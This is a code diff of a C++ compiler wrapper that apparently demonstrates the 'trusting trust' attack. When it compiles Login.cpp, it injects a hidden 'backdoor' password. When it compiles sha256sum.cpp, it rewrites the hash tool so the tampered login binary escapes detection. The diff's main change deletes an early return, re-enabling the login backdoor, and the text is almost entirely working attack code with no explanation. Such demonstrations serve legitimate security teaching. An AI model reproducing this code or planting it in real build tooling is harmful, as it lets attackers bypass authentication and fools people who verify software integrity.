@@ -19,12 +19,11 @@ void findAndReplace(string fileName, string regexPattern, string newText) {
 
 void compileLoginWithBackdoor(string allArgs) {
     system("cat Login.cpp > LoginWithBackdoor.cpp");
-	findAndReplace(
+    findAndReplace(
         "LoginWithBackdoor.cpp",
         "enteredPassword == \"test123\"",
         "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
     );
-    return;
     string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
 	system(modifiedCommand.c_str());
 	remove("LoginWithBackdoor.cpp");
@@ -44,7 +43,7 @@ void cloneMyselfInsteadOfCompiling(int argc, char* argv[]) {
 
 void compileSha256WithBackdoor(string allArgs) {
     system("cat sha256sum.cpp > sha256sumWithBackdoor.cpp");
-	findAndReplace(
+    findAndReplace(
         "sha256sumWithBackdoor.cpp",
         "string computeHashCmd .*;",
         "string computeHashCmd = fileName == \"Login\" ? \
@@ -54,12 +53,12 @@ void compileSha256WithBackdoor(string allArgs) {
         "
     );
     string modifiedCommand = "g++ " + regex_replace(allArgs, regex("sha256sum.cpp"), "sha256sumWithBackdoor.cpp");
-	system(modifiedCommand.c_str());
-	remove("sha256sumWithBackdoor.cpp"); 
+    system(modifiedCommand.c_str());
+    remove("sha256sumWithBackdoor.cpp"); 
 }
 
 int main(int argc, char *argv[]) {
-	string allArgs = "";
+    string allArgs = "";
     for(int i=1; i<argc; i++)
         allArgs += " " + string(argv[i]);
     string shellCommand = "g++" + allArgs;
@@ -71,5 +70,5 @@ int main(int argc, char *argv[]) {
     else if(fileName == "sha256sum.cpp")
         compileSha256WithBackdoor(allArgs); 
     else
-	    system(shellCommand.c_str());
+        system(shellCommand.c_str());
 }
